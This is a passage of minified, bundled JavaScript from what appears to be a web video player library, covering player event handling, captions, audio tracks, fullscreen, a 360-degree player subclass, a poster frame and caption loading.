e=0,t=F.length;e<t;e++)this._videoImpl.on(F[e],this._forwardEvent);for(e=0,t=M.length;e<t;e++)this._videoImpl.on(M[e],this._forwardReadyStateChange);this._videoImpl.on("timeupdate",this._onTimeUpdate),this._videoImpl.on("webkitpresentationmodechanged",this._onPresentationModeChanged),this._videoImpl.on("durationchange",this._onDurationChange),this._videoImpl.on("addtrack",this._forwardEvent),this._videoImpl.on("change",this._forwardEvent),this._videoImpl.on("removetrack",this._forwardEvent),this._videoImpl.on("addtrack",this._onCaptionsChanged),this._videoImpl.on("change",this._onCaptionsChanged),this._videoImpl.on("removetrack",this._onCaptionsChanged),this._videoImpl.on("loadedmetadata",this.refreshSize),this._videoImpl.on("loadeddata",this.refreshSize),this._videoImpl.on("play",this._onPlay),this._videoImpl.on("AudioTrackChange",this._onAudioTrackChange),this._videoImpl.on("volumechange",this._onVolumeChange),b?(p.on("enterfullscreen",this._forwardEnterFullScreenEvent),p.on("exitfullscreen",this._forwardExitFullScreenEvent),p.on("enterfullscreen",this._forwardFullScreenChangeEvent),p.on("exitfullscreen",this._forwardFullScreenChangeEvent),this.on("fullscreen:change",this._onFullscreenChange)):E&&(this._videoImpl.on("webkitbeginfullscreen",this._forwardEnterFullScreenEvent),this._videoImpl.on("webkitendfullscreen",this._forwardExitFullScreenEvent),this._videoImpl.on("webkitbeginfullscreen",this._forwardFullScreenChangeEvent),this._videoImpl.on("webkitendfullscreen",this._forwardFullScreenChangeEvent),w&&this.on("fullscreen:change",this._onFullscreenChange)),this._chapterEmitter&&this._chapterEmitter.on("change",this._onChapterChange),this._videoImpl.on("PlayPromiseError",this._onPlayPromiseError),this._videoImpl.on("PlayPromiseResolved",this._onPlayPromiseResolved),this._videoImpl.on("error",this._onError)}},{key:"_onPlayPromiseResolved",value:function(){this.trigger("PlayPromiseResolved")}},{key:"_removeEventListeners",value:function(){for(var e=0,t=F.length;e<t;e++)this._videoImpl.off(F[e],this._forwardEvent);for(e=0,t=M.length;e<t;e++)this._videoImpl.off(M[e],this._forwardReadyStateChange);this._videoImpl.off("timeupdate",this._onTimeUpdate),this._videoImpl.off("webkitpresentationmodechanged",this._onPresentationModeChanged),this._videoImpl.off("durationchange",this._onDurationChange),this._videoImpl.off("addtrack",this._forwardEvent),this._videoImpl.off("change",this._forwardEvent),this._videoImpl.off("removetrack",this._forwardEvent),this._videoImpl.off("addtrack",this._onCaptionsChanged),this._videoImpl.off("change",this._onCaptionsChanged),this._videoImpl.off("removetrack",this._onCaptionsChanged),this._videoImpl.off("loadedmetadata",this.refreshSize),this._videoImpl.off("loadeddata",this.refreshSize),this._videoImpl.off("play",this._onPlay),this._videoImpl.off("AudioTrackChange",this._onAudioTrackChange),this._videoImpl.off("volumechange",this._onVolumeChange),b?(p.off("enterfullscreen",this._forwardEnterFullScreenEvent),p.off("exitfullscreen",this._forwardExitFullScreenEvent),p.off("enterfullscreen",this._forwardFullScreenChangeEvent),p.off("exitfullscreen",this._forwardFullScreenChangeEvent)):E&&(this._videoImpl.off("webkitbeginfullscreen",this._forwardEnterFullScreenEvent),this._videoImpl.off("webkitendfullscreen",this._forwardExitFullScreenEvent),this._videoImpl.off("webkitbeginfullscreen",this._forwardFullScreenChangeEvent),this._videoImpl.off("webkitendfullscreen",this._forwardFullScreenChangeEvent),w&&this.off("fullscreen:change",this._onFullscreenChange)),this._chapterEmitter&&this._chapterEmitter.off("change",this._onChapterChange),this._videoImpl.off("PlayPromiseError",this._onPlayPromiseError),this._videoImpl.off("loadedmetadata",this.refreshSize),this._videoImpl.off("loadeddata",this.refreshSize),window.removeEventListener("DOMContentLoaded",this.refreshSize)}},{key:"_forwardReadyStateChange",value:function(){var e=this.getReadyState();(e>this._cachedReadyState||0===e)&&(this._cachedReadyState=e,this.trigger("readystatechange",{readyState:e}))}},{key:"_forwardEvent",value:function(e){D(e.type+" time:"+this.getCurrentTime()),this.trigger(e.type)}},{key:"_forwardNamedEvent",value:function(e){D(e+" time:"+this.getCurrentTime()),this.trigger(e)}},{key:"_onPlayPromiseError",value:function(){D("play() Promise rejected, probably because the browser is blocking autoplay"),this.el.classList.add(O),this._showStartState(),this._started=!1,this._poster.show(),this.once("play",this._onPlay)}},{key:"_onAudioTrackChange",value:function(e){var t=this,n=this.getAudioTracks();if(this._forwardEvent(e),this._storedAudioTrackType&&this._storedAudioTrackLanguage&&n.length>1){var i=n.find((function(e){return e.language===t._storedAudioTrackLanguage&&e.kind===t._storedAudioTrackType}));n.forEach((function(e){return e.enabled=!1})),i&&(i.enabled=!0),this._storedAudioTrackLanguage=null}var r=n.find((function(e){return e.enabled}));r&&(u.setItem(u.AUDIO_TRACK_TYPE,r.kind),u.setItem(u.AUDIO_TRACK_LANGUAGE,r.language))}},{key:"_onCaptionsChanged",value:function(e){var t=this,n=this.getVisibleTextTracks().length;if(!this._cachedVisibleTracksLength&&"none"!==this._storedCCLanguage&&this.getTextTracks().length>0){var i=this.getTextTracks().find((function(e){return e.language===t._storedCCLanguage||s[e.language]===t._storedCCLanguage}));i&&(setTimeout((function(){t.getTextTracks().forEach((function(e){i!==e&&(e.mode="hidden")})),i.mode="showing",setTimeout((function(){0===i.cues.length&&(i.mode="hidden",i.mode="showing")}),1)}),1),this._storedCCLanguage="none")}n>0&&this._cachedVisibleCCTrack!==this.getVisibleTextTracks()[0]?(this.trigger("texttrackshow"),u.setItem(u.CC_LANGUAGE,this.getVisibleTextTracks()[0].language)):0===n&&this._cachedVisibleTracksLength>0&&this.trigger("texttrackhide"),this._cachedVisibleTracksLength=n,this._cachedVisibleCCTrack=n?this.getVisibleTextTracks()[0]:null}},{key:"_onVolumeChange",value:function(e){u.setItem(u.VOLUME_LEVEL,this.getVolume()),u.setItem(u.VOLUME_MUTED,this.getMuted())}},{key:"_onTimeUpdate",value:function(){this.trigger("timeupdate",{currentTime:this.getCurrentTime()})}},{key:"load",value:function(e,t,n,i){if(this._setError(!1),this.refreshSize(),this._started=!1,Array.isArray(e)||(e=[e]),t&&!Array.isArray(t)&&(t=[{src:t}]),this._cachedReadyState=0,i||(i=this.options),this._urlOptimizer){t||(t=e.map(this._urlOptimizer.getCaptionsSource).filter((function(e){return!!e})));var r=this.getVisibleTextTracks();r&&r.length&&t&&t.length&&(t[0].mode="showing");var o=i.maxWidth||this._calcMaxWidth();e=e.map(function(e){return this._urlOptimizer.getVideoSource(e,o,null,{urlOptimizeHls:this.options.urlOptimizeHls})}.bind(this))}var s=i&&i.thumbnails||this._urlOptimizer&&this._urlOptimizer.getThumbnailImageSource(e[0]);this.once("play",this._onPlay),(this.options.autoplay&&b||this.getEnded())&&this.once("loadstart",function(){this.play()}.bind(this)),i||(i=this.options),i&&this._poster&&this.setPoster(i.poster),this._poster&&this._poster.show(),this.controls&&this.controls.sharingModule&&(i.sharing?this.controls.sharingModule.setData(i.sharing):this.controls.sharingModule.setData(null)),void 0!==i.live&&(this._isLive=i.live,this._useLiveMode(i.dvr)),this._hideEndState(),this._setPersistedUserSettings(),this._videoImpl.load(e,t,n),this.controls&&this.controls.overlays?this.controls.overlays.setData(s):this.controls&&this.once("controlsready",function(){this.controls.overlays&&this.controls.overlays.setData(s)}.bind(this)),this.controls&&this.controls.endState?this.controls.endState.setData(i.endState):this.controls&&this.once("controlsready",function(){this.controls.endState&&this.controls.endState.setData(i.endState)}.bind(this))}},{key:"_calcMaxWidth",value:function(){return this.el.parentElement?this.el.parentElement.clientWidth:this._maxWidth}},{key:"_isActiveArea",value:function(e){for(;e!==this.el;){if(e.hasAttribute("data-acv-active-area"))return!0;e=e.parentNode}return!1}},{key:"_onPresentationModeChanged",value:function(e){this._forwardEvent(e);var t=this.isPictureInPicture();this._cachedPiPMode!==t&&(this._cachedPiPMode=t,D("pictureinpicture:change to "+t),this.trigger("pictureinpicture:change"))}},{key:"_onDurationChange",value:function(e){(this._isDvr||this.getDuration()>3600)&&this.el.classList.add("longform"),this.refreshSize()}},{key:"appendTo",value:function(e){e.appendChild(this.el),this.refreshSize()}},{key:"getTextTracks",value:function(){return Array.prototype.slice.call(this._videoImpl.getTextTracks())}},{key:"getAudioTracks",value:function(){return Array.from(this._videoImpl.getAudioTracks())}},{key:"getVisibleTextTracks",value:function(){var e=Array.prototype.slice.call(this._videoImpl.getTextTracks());return e&&e.length&&(e=e.filter((function(e){return"showing"===e.mode}))),e}},{key:"getFullScreenElement",value:function(){return b?this.el:this.getMediaElement()}},{key:"getFullScreenEnabled",value:function(){return p.fullscreenEnabled(this.getFullScreenElement())}},{key:"isFullscreen",value:function(){return b?p.fullscreenElement()===this.getFullScreenElement():this._videoImpl.isFullscreen()}},{key:"requestFullscreen",value:function(){if(!this.isFullscreen()){this.controls&&(this.controls.el.display="none",this._hideControls()),this.trigger("fullscreen:willenter",{type:"enter"}),this._lastResize=Date.now(),g(this._updateFullscreenId);var e=this;this._updateFullscreenId=v((function t(){e.refreshSize(),e._updateFullscreenId=v(t)})),x?setTimeout(function(){this._lastResize=Date.now(),p.requestFullscreen(this.getFullScreenElement())}.bind(this),300):p.requestFullscreen(this.getFullScreenElement())}}},{key:"exitFullscreen",value:function(){this.isFullscreen()&&(this.controls&&(this.controls.el.display="none",this._hideControls()),this.trigger("fullscreen:willexit",{type:"exit"}),x?setTimeout(function(){p.exitFullscreen(this.getFullScreenElement())}.bind(this),300):p.exitFullscreen(this.getFullScreenElement()))}},{key:"_onFullscreenChange",value:function(){this._lastResize=Date.now(),this.controls&&(this.controls.el.display="",this._hideControls()),this._preventUserInteraction=!0,setTimeout(function(){g(this._updateFullscreenId),this._preventUserInteraction=!1,this.refreshSize()}.bind(this),750),this.refreshSize()}},{key:"toggleFullscreen",value:function(){this.isFullscreen()?this.exitFullscreen():this.requestFullscreen()}},{key:"_initUIComponents",value:function(){this._controlsFactory?(this._instantiateDefaultCustomUIControls(),b?this.el.appendChild(this._blockade.el):(this.controls.el.classList.add("mobile"),this.setControls(!0))):this.setControls(!0)}},{key:"_showControls",value:function(){this._controlsVisible=!0,this.el.classList.remove(O),this.el.classList.add(T)}},{key:"_hideControls",value:function(){this._controlsVisible=!1,this.el.classList.remove(T),this.hideCaptionsSelector()}},{key:"_raiseControls",value:function(){this._controlsVisible=!0,this.el.classList.remove(C)}},{key:"_lowerControls",value:function(){this._controlsVisible=!1,this.el.classList.add(C),this.hideCaptionsSelector()}},{key:"_onControlsReady",value:function(){this.options.autoplay&&b||this._showStartState()}},{key:"_showStartState",value:function(){this.controls&&this.controls.el.classList.add("start-state"),this._poster&&this._poster.show(),b||j(this.getMediaElement())}},{key:"_hideStartState",value:function(){this.controls&&this.controls.el.classList.remove("start-state"),this._poster&&this._poster.hide(),b||B(this.getMediaElement())}},{key:"_showEndState",value:function(){this.controls&&(this.controls.mainControlsElement?this.controls.mainControlsElement.contains(document.activeElement)&&setTimeout(function(){this.controls.playButtonElement.focus()}.bind(this)):this.el.contains(document.activeElement)&&!this.controls.sharingModule.el.contains(document.activeElement)&&setTimeout(function(){this.controls.playButtonElement.focus()}.bind(this)),this.controls.el.classList.add("end-state")),this._poster&&this._poster.show(),j(this.getMediaElement())}},{key:"_hideEndState",value:function(){this.controls&&this.controls.el.classList.remove("end-state"),b||B(this.getMediaElement())}},{key:"_createBlockade",value:function(){this._blockade=new c(document.createElement("div")),this._blockade.el.classList.add("ac-video-blockade")}},{key:"_instantiateDefaultCustomUIControls",value:function(){return this.controls=this._controlsFactory.create({player:this,endState:this.options.endState,enableMainControls:b,basePath:this.options.localizationBasePath,forceEnglishLabels:this.options.forceEnglishLabels,template:this.options.template,readyCallback:function(){this._onControlsReady(),this.trigger("controlsready")}.bind(this)}),this.controls.el.parentNode!==this.el&&this.el.appendChild(this.controls.el),this._videoImpl.setControls(!1),this._createBlockade(),this._controlsInteraction=N({player:this,keyboardControl:this._keyboardControl,controlsTimeoutDuration:this.options.controlsTimeoutDuration,showControls:this._showControls,hideControls:this._hideControls,raiseControls:this._raiseControls,lowerControls:this._lowerControls,controlsVisible:function(){return this._controlsVisible}.bind(this),sendMouseDown:this._videoImpl.sendMouseDown,elementEmitter:this._elementEmitter}),this.controls}},{key:"_onPlay",value:function(){this._started||this.once("timeupdate",this._onStart,function(){return this.getCurrentTime()>0&&!this.getPaused()}.bind(this))}},{key:"isCaptionsSelectorShowing",value:function(){return this.controls.el.classList.contains("captions-selector-showing")}},{key:"showCaptionsSelector",value:function(){this.controls.axListSelector.style.maxHeight="min("+(this.el.getBoundingClientRect().height-80)+"px,250px)",this.controls.el.classList.add("captions-selector-showing")}},{key:"hideCaptionsSelector",value:function(){this.controls.el.classList.remove("captions-selector-showing")}},{key:"_onStart",value:function(){this._started=!0,this.el.classList.add(O),this.el.classList.remove("idle-state"),this._poster&&this._poster.hide(),this.controls&&(this._hideStartState(),this._hideEndState()),this.once("ended",this._onEnded)}},{key:"_onEnded",value:function(){this.isFullscreen()&&this.exitFullscreen(),this.controls&&(this._hideStartState(),this._showEndState()),setTimeout(function(){this.once("timeupdate",function(){this.getEnded()?this._onEnded():this._onStart()}.bind(this))}.bind(this),300),this._poster&&this._poster.show(),this._started=!1}},{key:"_initPoster",value:function(e){this._poster=f({player:this,video:this._videoImpl,useNativePoster:!1===this.options.controls,is2x:y,src:e}),this._poster.el&&this.el.appendChild(this._poster.el),this.options.autoplay||this._poster.show()}},{key:"_initErrorView",value:function(){this._errorView=new _,this.el.appendChild(this._errorView.el)}},{key:"_useLiveMode",value:function(t){var n=this;clearInterval(this._captionRemovalInterval),this._isLive?(this.el.classList.add(A),t&&!S?this.el.classList.add(L):k&&(this._captionRemovalInterval=setInterval((function(){e("../utils/removeStateCaptions")(n.getMediaElement())}),1e4))):(this.el.classList.remove(A),this.el.classList.remove(L))}},{key:"once",value:function(e,t,r){if(arguments.length<3||"object"===(void 0===r?"undefined":i(r)))o(n.prototype.__proto__||Object.getPrototypeOf(n.prototype),"once",this).apply(this,arguments);else{var s=arguments,a=Array.prototype.slice.call(arguments,2),c=function(){a.every((function(e){return!!e()}))&&(s[1].apply(this,s),this.off(s[0],c))}.bind(this);this.on(s[0],c)}}},{key:"getMediaElement",value:function(){return this._videoImpl.getMediaElement()}},{key:"play",value:function(){var e=this;this.el.classList.remove("idle-state");var t=this._videoImpl.getCurrentTime();D("play called"),!this._videoImpl.getError()||0!==t&&!isNaN(t)?this._videoImpl.play():setTimeout((function(){e._errorView.focus()}),1e3)}},{key:"pause",value:function(){this._videoImpl.pause()}},{key:"seek",value:function(e){this.setCurrentTime.apply(this,arguments)}},{key:"addTextTrack",value:function(e){this._videoImpl.addTextTrack(e)}},{key:"getReadyState",value:function(){return this._videoImpl.getMediaElement().readyState}},{key:"getPreload",value:function(){return this._videoImpl.getPreload()}},{key:"setPoster",value:function(e){this._poster.setSrc(e)}},{key:"getPoster",value:function(){this._poster.getSrc()}},{key:"getVolume",value:function(){return this._videoImpl.getVolume()}},{key:"getMuted",value:function(){return this._videoImpl.getMuted()}},{key:"getCurrentTime",value:function(){return this._videoImpl.getCurrentTime()}},{key:"getDuration",value:function(){return this._videoImpl.getDuration()}},{key:"getPaused",value:function(){return this._videoImpl.getPaused()}},{key:"getEnded",value:function(){return this._videoImpl.getEnded()}},{key:"getBufferedPercentage",value:function(){var e=this.getCurrentTime(),t=this.getDuration();if(isNaN(t)||t===1/0)return 0;var n=this._videoImpl.getBuffered();if(n.length)for(var i=0;i<n.length;i++)if(n.start(i)<=e&&n.end(i)>e)return n.end(i)/t*100;return e/t*100}},{key:"setCurrentTime",value:function(e){return this._videoImpl.setCurrentTime(e)}},{key:"goToLive",value:function(){this._videoImpl.goToLive&&this._videoImpl.goToLive()}},{key:"isDvr",value:function(){return this._isDvr&&!S}},{key:"setVolume",value:function(e){return this.trigger("uservolumechange"),this._videoImpl.setVolume(e)}},{key:"setMuted",value:function(e){this.trigger("uservolumechange"),this._videoImpl.setMuted(e)}},{key:"setSrc",value:function(e){this._videoImpl.setSrc(e)}},{key:"getCurrentSrc",value:function(){return this._videoImpl.getCurrentSrc()}},{key:"setControls",value:function(e){return this._videoImpl.setControls(e)}},{key:"getMediaHeight",value:function(){return this._videoImpl.getMediaElement().videoHeight}},{key:"getMediaWidth",value:function(){return this._videoImpl.getMediaElement().videoWidth}},{key:"supportsPictureInPicture",value:function(){return this._videoImpl.supportsPictureInPicture()}},{key:"isPictureInPicture",value:function(){return this._videoImpl.isPictureInPicture()}},{key:"setPictureInPicture",value:function(e){return this._videoImpl.setPictureInPicture(e)}},{key:"supportsAirPlay",value:function(){return this._videoImpl.supportsAirPlay()}},{key:"isLive",value:function(){return this._isLive}},{key:"refreshSize",value:function(){this._breakpointDetect?this._breakpointDetect.refresh():(this._currentBreakpoint&&this.el.classList.remove(this._currentBreakpoint.name),this._currentBreakpoint=I.getBreakpointFromElement(this.el,P),this.el.classList.add(this._currentBreakpoint.name)),this._videoImpl&&this._videoImpl.refreshSize()}},{key:"_setError",value:function(e){e?this.el.classList.add("media-error"):this.el.classList.remove("media-error")}},{key:"_onError",value:function(e){var t=this._videoImpl.getError();if(this._started)D("ERROR: an error occured during playback, but we'll try to recover. Error code "+(t?t.message:"unknown"));else if(this._setError(!0),this.controls){var n=void 0;if(e.message)n=e.message;else{if(!m.translationReady())return void m.getTranslation({callback:this._onError.bind(this,e),forceEnglishLabels:this.options.forceEnglishLabels});n=m.getTranslation().error}this._poster.show(),this._errorView.setText(n)}}},{key:"_onChapterChange",value:function(e){this.trigger("chapter:change")}},{key:"getChapters",value:function(){return this._chapterEmitter.chapters}},{key:"setChapters",value:function(e){this._chapterEmitter.chapters=e}},{key:"getChapterForTime",value:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;return this._chapterEmitter.getChapterForTime(e,t)}},{key:"isStalled",value:function(){return this._videoImpl.isStalled()}},{key:"_setPersistedUserSettings",value:function(){if(b){if(this._storedCCLanguage=u.getItem(u.CC_LANGUAGE),u.hasItem("cc-disabled")&&(this._storedCCLanguage="none"),!this._storedCCLanguage){var e=function(e,t){if(Array.isArray(e))return e;if(Symbol.iterator in Object(e))return function(e,t){var n=[],i=!0,r=!1,o=void 0;try{for(var s,a=e[Symbol.iterator]();!(i=(s=a.next()).done)&&(n.push(s.value),!t||n.length!==t);i=!0);}catch(e){r=!0,o=e}finally{try{!i&&a.return&&a.return()}finally{if(r)throw o}}return n}(e,t);throw new TypeError("Invalid attempt to destructure non-iterable instance")}(navigator.language.split("-"),1)[0];this._storedCCLanguage="en"!==e?e:"none"}this._storedAudioTrackType=u.getItem(u.AUDIO_TRACK_TYPE),this._storedAudioTrackLanguage=u.getItem(u.AUDIO_TRACK_LANGUAGE),this._storedVolume=u.getItem(u.VOLUME_LEVEL),this._storedMuted=u.getItem(u.VOLUME_MUTED),null!==this._storedVolume&&this._videoImpl.setVolume(this._storedVolume),"true"===this._storedMuted&&(this._videoImpl.setMuted(!0),this._videoImpl.setVolume(1))}else this._storedCCLanguage="none"}},{key:"destroy",value:function(){this._removeEventListeners(),clearInterval(this._captionRemovalInterval),this.controls&&(this.controls.destroy(),this.controls=null),this._poster&&(this._poster.destroy(),this._poster=null),this._controlsInteraction&&(this._controlsInteraction.destroy(),this._controlsInteraction=null),this._keyboardControl&&this._keyboardControl.destroy(),this.el.innerHTML="",this._breakpointDetect&&this._breakpointDetect.destroy(),this._chapterEmitter&&this._chapterEmitter.destroy(),this._blockade&&(this._blockade=null),this._videoImpl.destroy(),this._videoImpl=null,clearTimeout(this._refreshSizeTimeout),a.prototype.destroy.call(this)}}]),n}(a);V.LOADEDMETADATA=1,V.LOADEDDATA=2,V.CANPLAY=3,V.CANPLAYTHROUGH=4,t.exports=V},{"../chapters/ChapterEmitter":308,"../dom-emitter/DOMEmitterMicro":309,"../event-emitter-shim/EventEmitterShim":310,"../posterframe/PosterFrameFactory":319,"../ui/DefaultBreakpoints":330,"../ui/controls-interaction/createControlsInteraction":352,"../ui/error/ErrorView":363,"../ui/keyboard-control/createKeyboardControl":369,"../ui/localization/LanguageMapping":372,"../ui/localization/Localization":373,"../utils/BreakpointDetect":386,"../utils/Storage":387,"../utils/getVersion":389,"../utils/removeStateCaptions":393,"../video/VideoFactory":404,"./event/EventsToForward":314,"./event/ReadyStateChangeEvents":315,"@marcom/ac-accessibility/helpers/hide":28,"@marcom/ac-accessibility/helpers/show":31,"@marcom/ac-console/log":69,"@marcom/ac-feature/isDesktop":127,"@marcom/ac-feature/isHandheld":128,"@marcom/ac-feature/isRetina":129,"@marcom/ac-feature/touchAvailable":131,"@marcom/ac-fullscreen":148,"@marcom/ac-raf-emitter/cancelUpdate":248,"@marcom/ac-raf-emitter/update":250,"@marcom/useragent-detect":435}],313:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=e("./Player"),s=e("../ui/controls-interaction/createControlsInteraction"),a=e("@marcom/useragent-detect").os,c=a.ios||a.android||!e("@marcom/ac-feature/isDesktop")(),l="threesixty-ui",u=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return e.threesixty&&n.el.classList.add("threesixty-video"),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"play",value:function(){this.get360().requestOrientationControl(),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"play",this).apply(this,arguments)}},{key:"_bindMethods",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_bindMethods",this).call(this),this._showCompass=this._showCompass.bind(this),this._hideCompass=this._hideCompass.bind(this),this.panToOrigin=this.panToOrigin.bind(this)}},{key:"_addEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_addEventListeners",this).call(this)}},{key:"_removeEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_removeEventListeners",this).call(this),this.controls.compass.removeEventListener("click",this.panToOrigin)}},{key:"_showCompass",value:function(){this.el.classList.add(l)}},{key:"_hideCompass",value:function(){this.el.classList.remove(l)}},{key:"_instantiateDefaultCustomUIControls",value:function(){return this.controls=this._controlsFactory.create({player:this,endState:this.options.endState,threesixty:!0,enableMainControls:!0,basePath:this.options.localizationBasePath,template:this.options.template,readyCallback:function(){this.options.autoplay&&!c||this._showStartState(),this.trigger("controlsready")}.bind(this)}),this.controls.el.parentNode!==this.el&&this.el.appendChild(this.controls.el),this._videoImpl.setControls(!1),this._createBlockade(),this._controlsInteraction=s({player:this,keyboardControl:this._keyboardControl,threesixty:!0,controlsTimeoutDuration:this.options.controlsTimeoutDuration,threesixtyElementsTimeoutDuration:this.options.threesixtyElementsTimeoutDuration,showControls:this._showControls,hideControls:this._hideControls,raiseControls:this._raiseControls,lowerControls:this._lowerControls,showCompass:this._showCompass,hideCompass:this._hideCompass,controlsVisible:function(){return this._controlsVisible}.bind(this),sendMouseDown:this._videoImpl.sendMouseDown,elementEmitter:this._elementEmitter}),this.controls}},{key:"panToOrigin",value:function(){this.get360().panToPosition({lat:0,lon:0})}},{key:"get360",value:function(){return this._videoImpl.get360()}},{key:"getFullScreenElement",value:function(){return this.el}},{key:"getFullScreenEnabled",value:function(){return!c&&r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"getFullScreenEnabled",this).call(this)}}]),t}(o);t.exports=u},{"../ui/controls-interaction/createControlsInteraction":352,"./Player":312,"@marcom/ac-feature/isDesktop":127,"@marcom/useragent-detect":435}],314:[function(e,t,n){"use strict";t.exports=["loadstart","progress","suspend","abort","error","emptied","stalled","play","pause","loadedmetadata","loadeddata","waiting","playing","canplay","canplaythrough","seeking","seeked","ended","ratechange","durationchange","volumechange","addtrack","change","removetrack"]},{}],315:[function(e,t,n){"use strict";t.exports=["loadstart","suspend","abort","error","emptied","stalled","loadedmetadata","loadeddata","waiting","canplay","canplaythrough"]},{}],316:[function(e,t,n){"use strict";var i=e("@marcom/ac-feature/isDesktop")();t.exports=function(t){var n;if(t?arguments.length>1&&(t=Object.assign.apply(null,Array.prototype.slice.apply(arguments))):t={},t.components||(t.components=e("../../ui/DefaultComponents")),void 0===t.controls&&(t.controls=!0),t.controlsImplementation||(t.controlsImplementation=e("../../ui/ControlBar")),t.controlsFactory||(t.controlsFactory=e("../../ui/ControlsFactory")({controlsImplementation:t.controlsImplementation,components:t.components,template:t.controlsTemplate})),(void 0!==t.urlOptimizer&&!0===t.urlOptimizer||"true"===t.urlOptimizer)&&(t.urlOptimizer=e("../../optimizeVideoUrl")),t.sources||t.src?t.sources||(t.sources=t.src?[t.src]:[]):t.sources=[],t.autoplay=void 0!==t.autoplay?t.autoplay:i,t.controlsTimeoutDuration||(t.controlsTimeoutDuration=3e3),t.threesixty){t.threesixtyElementsTimeoutDuration||(t.threesixtyElementsTimeoutDuration=3e3);var r=e("../ThreeSixtyPlayer");n=new r(t)}else{var o=e("../Player");n=new o(t)}var s={};return t.sharing&&(s.sharing=Object.assign({},t.sharing)),t.thumbnails&&(s.thumbnails=Object.assign({},t.thumbnails)),t.endState&&(s.endState=Object.assign({},t.endState)),t.sources&&t.sources.length&&(t.autoplay||!t.preload||"auto"===t.preload||!0===t.preload?n.load(t.sources,t.textTracks,t.startTime,s):n.setSrc(t.sources[0])),n}},{"../../optimizeVideoUrl":311,"../../ui/ControlBar":328,"../../ui/ControlsFactory":329,"../../ui/DefaultComponents":331,"../Player":312,"../ThreeSixtyPlayer":313,"@marcom/ac-feature/isDesktop":127}],317:[function(e,t,n){"use strict";t.exports=e("./createPlayer")},{"./createPlayer":316}],318:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r="ac-video-poster-hide",o=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.options=t,this._defaultSrc=t.src,this._initialize()}return i(e,[{key:"_initialize",value:function(){var e=this.options.src;this.el=this.options.el||document.createElement("div"),this._imgElement=document.createElement("img"),this._imgElement.src=e,this._currentSrc=e,this._imgElement.alt="",this._onLoad=this._onLoad.bind(this),this._imgElement.addEventListener("load",this._onLoad),this.el.appendChild(this._imgElement),this.hide(),this.el.classList.add("ac-video-poster")}},{key:"hide",value:function(){this.el.classList.add(r)}},{key:"show",value:function(){this.el.classList.remove(r)}},{key:"setSrc",value:function(e){var t=e||this._defaultSrc;t!==this._currentSrc&&(this._imgElement.style.display="none",this._imgElement.src=t,this._currentSrc=t)}},{key:"_onLoad",value:function(){this._imgElement.style.display=""}},{key:"getSrc",value:function(){return this._imgElement.src}},{key:"destroy",value:function(){this._imgElement.removeEventListener("load",this._onLoad),this._el=null}}]),e}();t.exports=o},{}],319:[function(e,t,n){"use strict";var i=e("./PosterFrame");t.exports=function(e){if(e.src=e.src||(e.is2x?"/ac/ac-video-posterframe/4.0/images/ac_video_poster_960x540_2x.jpg":"/ac/ac-video-posterframe/4.0/images/ac_video_poster_960x540.jpg"),e.useNativePoster){e.video.setPoster(e.src);var t=!1,n=void 0;return{show:function(){t=!0,n&&(e.video.setPoster(n),n=null)},hide:function(){t=!1},setSrc:function(i){t?i?e.video.setPoster(i):e.video.setPoster(e.src):n=i}}}return new i(e)}},{"./PosterFrame":318}],320:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("@marcom/ac-ajax-xhr"),o=e("@marcom/ac-function/throttle"),s=e("./parseVTT"),a=function(){function e(t,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._view=t,this._video=n.video,this._refreshTracks=this._refreshTracks.bind(this),this._throttledRefreshCurrentCaption=o(this._refreshCurrentCaption.bind(this,300)),this._addTrackListeners()}return i(e,[{key:"_addTrackListeners",value:function(){this._video.on("addtrack",this._refreshTracks),this._video.on("removetrack",this._refreshTracks),this._video.on("change",this._refreshTracks)}},{key:"_addVideoListeners",value:function(e){if(!e.cues){this._view.setText("");try{r.get(e.src,{complete:function(t){e.cues=s(t.responseText),this._addVideoListeners(e),this._refreshCurrentCaption()}.bind(this),error:function(e){}.bind(this)})}catch(e){}}this._video.on("loadstart",this._refreshTracks),this._video.on("timeupdate",this._throttledRefreshCurrentCaption)}},{key:"_removeVideoListeners",value:function(){this._video.off("loadstart",this._refreshTracks),this._video.off("timeupdate",this._throttledRefreshCurrentCaption)}},{key:"_refreshTracks",value:function(){var 